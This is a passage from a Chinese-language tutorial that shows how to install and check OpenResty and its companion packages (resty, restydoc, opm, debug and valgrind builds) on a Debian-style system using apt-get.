<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>检查 nginx 进程是否启动并运行。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ps</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> aux</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">grep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>完美。</p>
<p>用 <code>curl</code> 命令测试默认主页。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 127.0.0.1/</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>是的，它的工作。</p>
<p>但请注意，resty 命令行工具还没有安装。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">which</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> resty</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>如果你想要它，那么你可以从同一个仓库安装 <code>openresty-resty</code> RPM 包。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> openresty-resty</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>现在应该可以了。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">which</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> resty</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">resty</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -e</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'print("Hello Resty")'</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p></p>
<p>同样，如果你想使用 <code>restydoc</code> 命令行工具，你应该安装 <code>openresty-doc</code> 包。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> openresty-restydoc</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>现在也有了。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">restydoc</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> content_by_lua_file</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>我们也可以安装 OPM 来安装更多由 OpenResty 社区贡献的 Lua 模块。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> openresty-opm</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>现在可以尝试安装 James Hurst 编写的 <code>lua-resty-http</code> 库。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> opm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pintsized/lua-resty-http</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>试着用 <code>resty</code> 工具加载它。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">resty</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -e</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'require "resty.http"'</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>成功了！</p>
<p>还有一个 OpenResty 的调试构建，其中包括调试日志和所有启用的内部断言。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> openresty-debug</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>我们可以这样调用这个调试版的 openresty 。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">which</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> openresty-debug</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>这个 <code>openresty-debug</code> 可执行文件也是一个符号链接。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">file</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> `</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">which</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> openresty-debug`</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>我们不应该在生产中使用它，因为它比发行版慢得多。</p>
<p>此外，还有可以通过 Valgrind 检查内存问题的特殊构建。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> openresty-valgrind</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>当你有内存问题要调试时，可以试试这些。我们可能会在以后的教程中涉及这些内容。</p>
<p>要将 OpenResty 包升级到最新版本，只需运行这些命令。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> update</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --only-upgrade</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'openresty*'</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p></p>
<p>检查我们 openresty 仓库中所有可用的软件包。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">apt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'openresty*'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">less</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>这里有很多二进制包。</p>
<p>可以在网页上找到所有这些 Deb 包的详细文档，https://openresty.org/en/deb-packages.html ，有很多软件包供用户选择。</p>
<p></p>
]]></content:encoded>
    </item>
  </channel>
</rss>